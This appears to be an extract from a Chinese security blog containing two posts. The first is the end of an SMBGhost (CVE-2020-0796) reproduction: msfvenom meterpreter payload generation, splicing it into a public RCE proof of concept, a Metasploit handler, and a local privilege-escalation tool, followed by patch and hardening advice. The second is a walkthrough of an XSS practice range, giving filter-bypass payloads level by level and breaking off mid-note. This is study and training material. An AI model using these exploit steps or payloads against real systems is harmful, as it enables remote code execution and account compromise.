<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605110127820.png" alt="image-20200605110127820"></p>
<p>生成反向连接木马</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">msfvenom</span> -p windows/x64/meterpreter/bind_tcp l<span class="keyword">port</span>=6666 -f py -o link.py</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605105937620.png" alt="image-20200605105937620"></p>
<p>将生成的py文件中的变量”buf”替换为”USER_PAYLOAD”</p>
<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605110624030.png" alt="image-20200605110624030"></p>
<p>替换变量名完成后并将其所有代码与SMBGhost_RCE_PoC中的exploit.py的中的部分相似内容（如图）进行覆盖替换</p>
<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605110911519.png" alt="image-20200605110911519"></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动msf配置</span></span><br><span class="line">kali@kali:~$ msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload windows/x64/meterpreter/bind_tcp <span class="comment">#设置反弹模式</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.174</span><span class="number">.135</span> <span class="comment">#设置目标靶机</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> lport <span class="number">6666</span> <span class="comment">#设置监听端口</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">run</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605111713673.png" alt="image-20200605111713673"></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># 执行<span class="selector-tag">exploit</span><span class="selector-class">.py</span></span><br><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-tag">-ip</span> 192<span class="selector-class">.168</span><span class="selector-class">.174</span><span class="selector-class">.135</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605122324146.png" alt="image-20200605122324146"></p>
<h5 id="本地提权漏洞复现"><a href="#本地提权漏洞复现" class="headerlink" title="本地提权漏洞复现"></a>本地提权漏洞复现</h5><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">https://github.com/danigargu/CVE<span class="string">-2020</span><span class="string">-0796</span>/releases</span><br><span class="line">下载后直接命令行运行可执行程序（cve<span class="string">-2020</span><span class="string">-0796</span>-local.exe）</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605124404688.png" alt="image-20200605124404688"></p>
<h4 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h4><p>1、更新官方补丁KB4551762或者KB4556799（累计更新补丁包）。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">官方补丁</span><br><span class="line"><span class="number">3</span>月<span class="number">12</span>日更新补丁（KB4551762）：</span><br><span class="line">http<span class="variable">s:</span>//portal.msrc.microsoft.<span class="keyword">com</span>/<span class="keyword">en</span>-US/security-guidance/advisory/CVE-<span class="number">2020</span>-<span class="number">0796</span></span><br><span class="line"> </span><br><span class="line">最新更新补丁（KB4556799）：</span><br><span class="line">http<span class="variable">s:</span>//www.catalog.<span class="keyword">update</span>.microsoft.<span class="keyword">com</span>/Search.aspx?q=KB4556799</span><br></pre></td></tr></table></figure>

<p>2、对SMB通信139/445端口进行封禁。</p>
<p>3、PowerShell命令禁用压缩功能，以阻止未经身份验证的攻击者利用     SMBv3服务器的漏洞。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span>-ItemProperty -<span class="keyword">Path</span> <span class="string">"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> DisableCompression -<span class="keyword">Type</span> DWORD -<span class="keyword">Value</span> <span class="number">1</span> -<span class="keyword">Force</span></span><br></pre></td></tr></table></figure>



<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html" target="_blank" rel="noopener">https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html</a></p>
<p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</a></p>
<p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
<p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a></p>
<p><a href="https://paper.seebug.org/1164/" target="_blank" rel="noopener">https://paper.seebug.org/1164/</a></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>haozi_XSS靶场通关记录</title>
    <url>/2020/05/11/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>XSS平台：<a href="https://xss.haozi.me/" target="_blank" rel="noopener">https://xss.haozi.me/</a></p>
<p>Github：<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a></p>
<a id="more"></a>

<h4 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h4><h5 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 常见payload</span></span><br></pre></td></tr></table></figure>

<h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;<span class="xml"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">// 在textarea内需闭合textarea标签</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//input code</span></span><br><span class="line"><span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在value值中需"&gt;进行闭合</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;script&gt;alert<span class="string">`1`</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ g全局匹配，“[()]”替换为空，用``代替</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;img src=x onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// g全局匹配，“[()`]”替换为空,进行实体编码绕过</span></span><br></pre></td></tr></table></figure>

<h5 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">--!&gt;</span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"><span class="comment">// g全局匹配，“--&gt;”替换为😂</span></span><br><span class="line"><span class="comment">// 注释有两种&lt;!-- 注释 --&gt;、&lt;!-- 注释 --!&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">onmousemove</span><br><span class="line">=alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ig全局匹配并忽略大小写,正则匹配“auto|on.*=|&gt;”替换为_</span></span><br><span class="line"><span class="comment">// 没有匹配换行可进行换行绕过，插入后需移动鼠标</span></span><br><span class="line"><span class="comment">// onmousemove 鼠标被移动,可参考：https://www.runoob.com/jsref/dom-obj-event.html</span></span><br></pre></td></tr></table></figure>

<h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)</span><br><span class="line">     </span><br><span class="line"><span class="comment">// ig全局匹配并忽略大小写，正则匹配"&lt;\/?[^&gt;]+&gt;"替换为空</span></span><br><span class="line"><span class="comment">// 回车自动补全</span></span><br></pre></td></tr></table></figure>

<h5 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;<span class="regexp">/style</span></span><br><span class="line"><span class="regexp">&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ ig全局匹配并忽略大小写，匹配“&lt;/</span>style&gt;”替换为<span class="comment">/* 坏人 */</span></span><br><span class="line"><span class="comment">// 利用换行绕过匹配</span></span><br></pre></td></tr></table></figure>

<h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">http:<span class="comment">//www.segmentfault.com" &gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配输入的是否存在"http://www.segmentfault.com"</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">https:<span class="comment">//www.segmentfault.com@xss.haozi.me/j.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里引入一个靶场自身站点下的js文件（多次尝试无果，最后使用的火狐浏览器）</span></span><br></pre></td></tr></table></figure>

<p>注解：</p>
<p>chrome浏览器因为弃用了一些@嵌入式的一些请求，所以使用了火狐浏览器做这道题。</p>
<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513100657413.png" alt="image-20200513100657413"></p>
<p>自己搭建VPS需支持HTTPS请求否则无法加载js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">https:<span class="comment">//www.segmentfault.com@vps地址/xss.js</span></span><br></pre></td></tr></table></figure>

<p>非要使用HTTP，需在about:config配置文件中将修改security.mixed_content.block_active_content为false，不然会出现混合活动内容</p>
<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513101558581.png" alt="image-20200513101558581"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">http:<span class="comment">//www.segmentfault.com@vps地址/xss.js</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513093911763.png" alt="image-20200513093911763"></p>
<h5 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将输入的字符串转换成大写</span></span><br><span class="line"><span class="comment">// HTML不区分大小写，JavaScript区分大小写；JavaScript是一种区分大小写的语言，对变量方法的命名有严格的大小写敏感。</span></span><br><span class="line"><span class="comment">// js函数进行Unicode编码</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将输入的字符串转换成大写并不区分大小写匹配“script”替换为空</span></span><br><span class="line"><span class="comment">// js函数进行Unicode编码或进行双写绕过</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">			<span class="comment">//这里有个换行</span></span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用换行逃逸注释,利用html的"--&gt;"注释掉后面字符</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ſcript src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 古英文字符ſ大写后为S（ſ不等于s）</span></span><br><span class="line"><span class="comment">// 脑洞题</span></span><br><span class="line"><span class="comment">// 如果使用加载外部js文件需注意是否区分大小写</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">');alert(1) //</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 浏览器会先解析html,然后再解析js,实体编码了也可以正常解析进行闭合后插入alert,注释后面字符</span></span><br></pre></td></tr></table></figure>

<h5 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//input code</span></span><br><span class="line"><span class="string">""</span>;alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭合或传值;再进行插入alert</span></span><br></pre></td></tr></table></figure>

<h5 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// "</span>\/\/<span class="string">"转义在js中还是注释</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)("</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转义后还是",进行闭合前后的内容</span></span><br></pre></td></tr></table></figure>

<p>注解：</p>
